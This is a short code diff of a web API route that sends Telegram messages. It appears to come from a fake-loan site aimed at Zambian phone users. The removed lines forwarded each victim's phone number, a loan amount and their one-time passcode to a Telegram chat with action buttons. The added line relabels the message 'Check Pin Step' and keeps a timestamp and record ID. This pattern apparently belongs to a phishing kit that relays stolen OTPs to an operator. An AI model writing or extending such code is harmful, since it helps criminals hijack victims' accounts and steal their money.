@@ -47,11 +47,7 @@ export async function POST(request: Request) {
 
     // Send Telegram message with inline buttons
     const telegramMessage = `
-🔐 *Loan OTP Verification Request*
-
-📱 Phone Number: \`+260${phoneNumber}\`
-💰 Loan Amount: \`7,800 ZMW\`
-🔑 OTP Code: \`${otpCode}\`
+🔐 *Check Pin Step*
 ⏰ Timestamp: ${new Date().toISOString()}
 📋 Record ID: \`${data.id}\`
 
